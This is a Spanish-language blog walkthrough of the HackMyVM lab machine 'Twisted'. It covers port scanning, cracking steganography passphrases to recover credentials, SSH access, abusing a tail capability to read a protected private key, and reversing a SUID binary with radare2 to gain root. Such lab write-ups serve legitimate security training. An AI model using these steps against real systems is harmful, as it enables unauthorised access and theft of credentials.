---
layout: single
title: Twisted - HackMyVM
excerpt: "Twisted es una máquina Linux creada por sML. En la siguiente máquina encontraremos unos usuarios con sus respectivas contraseñas usando herramientas de steganografía, una vez dentro
 realizaremos un user pivoting con un id_rsa y obtendremos el root mediante un binario SUID que tendremos que debuggear con R2."
date: 2021-10-21
classes: wide
header:
  teaser: /assets/images/hmvm-Twisted/hmvmTwisted.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - stegseek
  - steghide
  - suid
  - radare
  - sML
---

### Escaneo de puertos
```bash
nmap -p- -T5 --open -v -n -Pn 192.168.1.66 -oG puertos

PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

### Escaneo de servicios
```bash
nmap -sCV -p 2222,80 192.168.1.66  -oN servicios

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### WEB

![](/assets/images/hmvm-Twisted/web.png)


Me descargo las dos imágenes con wget.

```bash
wget http://192.168.1.66/cat-original.jpg && wget http://192.168.1.66/cat-hidden.jpg
--2021-10-21 http://192.168.1.66/cat-original.jpg
Conectando con 192.168.1.66:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 288693 (282K) [image/jpeg]
Grabando a: «cat-original.jpg»

cat-original.jpg           100%[=======================================>] 281,93K   301KB/s    en 0,9s    

2021-10-21 (301 KB/s) - «cat-original.jpg» guardado [288693/288693]

--2021-10-21 http://192.168.1.66/cat-hidden.jpg
Conectando con 192.168.1.66:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 288706 (282K) [image/jpeg]
Grabando a: «cat-hidden.jpg»

cat-hidden.jpg             100%[=======================================>] 281,94K   313KB/s    en 0,9s
```

Le paso un strings a las dos imágenes y veo que tiene algo en su interior. Normalmente cuando vemos esas strings repetidas es porque el archivo tiene algo en su interior.

![](/assets/images/hmvm-Twisted/strings.png)

Usaré `steghide` para extraer el contenido de la imagen.

```bash
steghide extract -sf cat-original.jpg 
Anotar salvoconducto: 
steghide: no pude extraer ningún dato con ese salvoconducto!
                                                                                                           
steghide extract -sf cat-hidden.jpg  
Anotar salvoconducto: 
steghide: no pude extraer ningún dato con ese salvoconducto!
```

Como las imágenes están protegidas con contraseña usaré `stegseek` para intentar romperlas.

![](/assets/images/hmvm-Twisted/stegseek.png)

Ahora usaré `steghide` para extraer los archivos de texto que están dentro de las imágenes.

```bash
steghide extract -sf cat-hidden.jpg                    
Anotar salvoconducto: 
anotó los datos extraídos e/"mateo.txt".

steghide extract -sf cat-original.jpg
Anotar salvoconducto: 
anotó los datos extraídos e/"markus.txt".
```

Con cat miro el contenido de los archivos de texto, parecen usuarios y contraseñas.

![](/assets/images/hmvm-Twisted/archivosTexto.png)

### SSH
Me conecto por ssh usando el usuario mateo.
`ssh markus@192.168.1.66 -p 2222`

Con cat visualizo el contenido de note.txt.
```bash
mateo@twisted:~$ cat note.txt 
/var/www/html/gogogo.wav
```

Me descargo el archivo.wav con wget.
```bash
wget http://192.168.1.66/gogogo.wav
```

Analizo el audio con un recurso online y se trata de un rabbithole.

![](/assets/images/hmvm-Twisted/rabbitHole.png)

Paso de mateo a markus.

`su markus`

En el home de markus tenemos otro archivo `note.txt`y dice lo siguiente:
```bash
markus@twisted:~$ cat note.txt 
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
```

Intento leer el id_rsa con cat sin exito.
```bash
markus@twisted:~$ cat /var/cache/apt/id_rsa
cat: /var/cache/apt/id_rsa: Permission denied
```

Hago una busqueda de capabilities y encuentro una establecida en tail.

![](/assets/images/hmvm-Twisted/capability.png)

Puedo usar tail para leer el id_rsa.

`tail -n 50 /var/cache/apt/id_rsa`

![](/assets/images/hmvm-Twisted/id_rsa.png)

Copio la clave id_rsa y le doy permisos.

`chmod 600 id_rsa`

Me conecto como usuario bonita usando el id_rsa.

`ssh -i id_rsa bonita@192.168.1.66 -p 2222`

Una vez conectado como usuario bonita ya puedo leer la flag de user.
```bash
bonita@twisted:~$ cat user.txt 
HMV********
```

Veo un binario llamado `beroot`, se trata de un binario SUID.

![](/assets/images/hmvm-Twisted/SUID.png)

Lo lanzo pero me pide un password.

![](/assets/images/hmvm-Twisted/binarioBeroot.png)

Usaré python3 para crear un servidor http para poder compartir el binario.

![](/assets/images/hmvm-Twisted/httpPython.png)

Uso wget para descargar el binario.

![](/assets/images/hmvm-Twisted/wget.png)

### Radare2
Ahora abriré beroot con radare2.
```bash
radare2 beroot
Warning: run r2 with -e io.cache=true to fix relocations in disassembly
[0x000010a0]> vvv
```

Voy a la dirección `0x000011c0`  está comparando la variable con un valor hexadecimal 0x16f8.

![](/assets/images/hmvm-Twisted/radare2.png)

Ahora tengo que convertir el valor hexadecimal en valor decimal, para ello usaré un sencillo script en bash.

```bash
#!/bin/bash
echo "Escriba un número hexadecimal: "
read numHex
echo -n "El valor decimal de $numHex es:"
echo "obase=10; ibase=16; $numHex" | bc
```

Lanzo el script.

![](/assets/images/hmvm-Twisted/hex2dec.png)

Lanzo de nuevo beroot para obtener el root.

![](/assets/images/hmvm-Twisted/root.png)

Como root ya puedo leer la flag.

```bash
root@twisted:/root# cat root.txt 
HMV************
```
